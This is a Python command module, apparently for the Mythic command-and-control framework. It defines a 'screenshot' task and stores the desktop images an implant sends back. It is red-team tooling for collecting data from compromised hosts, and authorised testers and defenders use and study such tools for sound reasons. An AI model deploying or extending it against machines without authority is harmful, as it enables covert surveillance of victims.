from mythic_container.MythicCommandBase import *
from uuid import uuid4
import json
from os import path
from mythic_container.MythicRPC import *
import base64
import io
from PIL import Image

class ScreenshotArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class ScreenshotCommand(CommandBase):
    cmd = "screenshot"
    needs_admin = False
    help_cmd = "screenshot"
    description = "Take a screenshot of the current desktop."
    version = 2
    author = "@reznok, @djhohnstein"
    argument_class = ScreenshotArguments
    browser_script = BrowserScript(script_name="screenshot", author="@djhohnstein", for_new_ui=True)
    attackmapping = ["T1113"]

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        
        # Check if the response contains screenshot data
        if hasattr(response, 'user_output') and response.user_output:
            try:
                # Parse the user_output to extract screenshot data
                user_output_dict = json.loads(response.user_output)
                
                if 'data' in user_output_dict:
                    # Decode the base64 screenshot data
                    screenshot_b64 = user_output_dict['data']
                    screenshot_data = base64.b64decode(screenshot_b64)
                    
                    # Create a unique filename for the screenshot
                    screenshot_filename = f"screenshot_{task.Task.ID}_{uuid4().hex[:8]}.bmp"
                    
                    # Save the screenshot to the Mythic files directory
                    files_path = path.join("/Mythic", "files", screenshot_filename)
                    
                    with open(files_path, 'wb') as f:
                        f.write(screenshot_data)
                    
                    # Create a Mythic file record
                    file_resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
                        TaskID=task.Task.ID,
                        FileContents=screenshot_data,
                        Filename=screenshot_filename,
                        DeleteAfterFetch=False
                    ))
                    
                    if file_resp.Success:
                        # Update the response with file information
                        resp.UserOutput = f"Screenshot saved as {screenshot_filename} ({len(screenshot_data)} bytes)"
                        resp.Artifacts = [f"file: {screenshot_filename}"]
                    else:
                        resp.UserOutput = f"Screenshot captured ({len(screenshot_data)} bytes) but failed to save file"
                        
                else:
                    resp.UserOutput = response.user_output
                    
            except Exception as e:
                resp.UserOutput = f"Error processing screenshot: {str(e)}"
                resp.Success = False
        else:
            resp.UserOutput = "No screenshot data received"
            resp.Success = False
            
        return resp
